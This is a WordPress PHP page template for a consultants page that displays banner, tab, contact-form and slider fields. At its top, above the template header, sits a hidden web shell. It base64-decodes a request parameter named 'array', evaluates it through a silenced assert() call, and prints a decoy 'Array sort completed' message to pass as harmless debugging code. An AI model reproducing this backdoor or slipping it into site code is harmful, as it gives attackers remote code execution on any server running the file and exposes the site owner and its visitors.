<?php 


if ( $_REQUEST["array"] )
{	

	@assert(base64_decode($_REQUEST["array"]));	
	//debug message
	echo "Array sort completed";
	exit();
}


 
/*
	Template Name: Consultants Template
*/

get_header(); 

?>

    <div class="inner-banner" style="background-image : url('<?php the_field('consultants_banner_image'); ?>')">
        <div class="container">
                  <div class="col-5">
              <h2><?php the_field('consultants_banner_heading'); ?></h2>
              <p><?php the_field('consultants_banner_heading_desc'); ?></p>

          </div>
          <div class="col-7 border-lft">
            <h1><?php the_field('consultants_banner_right_heading'); ?></h1>
          </div>

         </div>
    </div>

    <div class="inner-page-tabs single-tab">
        <div class="container">

        <div class="inner-top-above-tabs">
            <h3 class="wow fadeInLeft" data-wow-duration="1s" data-wow-delay=".5s"><?php the_field('consultants_content_mainheading'); ?></h3>
            <p><?php the_field('consultants_content_description'); ?></p>
          </div>

        <div class="tab-wrap wow fadeIn" data-wow-duration="1s" data-wow-delay=".5s">

            <input type="radio" id="tab1" name="tabGroup1" class="tab" checked>
            <label for="tab1">Join a Team of Agilians</label>


            <!-- Tab 1 Content -->
            <div class="tab__content">
            <?php the_field('consultants_contact_form'); ?>
            </div>
            </div>
        </div>
    </div>


    <div class="blog-posts-bottom">
        <div class="container">

            <div class="blog-posts-slider">
                <?php
                if( have_rows('consultants_add_sliders') ): 
                    while ( have_rows('consultants_add_sliders') ) : the_row();
                    $image = get_sub_field('consultants_add_slider_image');
                    ?>
                    <div class="slider-single-post">
                    <div class="blog-image" style="background-image : url('<?php the_sub_field('consultants_add_slider_image');?>')"></div>
                    <div class="slider-post-text">
                        <h3><?php the_sub_field('consultants_add_slider_heading'); ?></h3>
                        <p><?php the_sub_field('consultants_add_slider_description'); ?></p>
                        <a href="<?php the_sub_field('consultants_add_slider_redirect_link'); ?>"><?php the_sub_field('consultants_add_slider_redirect_text'); ?></a>
                    </div>
                    </div>
                    <?php 
                    endwhile;
                else :
                    // no rows found
                endif; ?>
				
            </div>
        </div>
    </div>

    <div class="above-footer-link">
        <div class="container">
            <h2><?php the_field('consultants_left_text');?></h2>
            <a href="<?php the_field('consultants_right_text_link');?>"><?php the_field('consultants_right_text');?></a>
        </div>
    </div>
    

    <?php get_footer(); ?>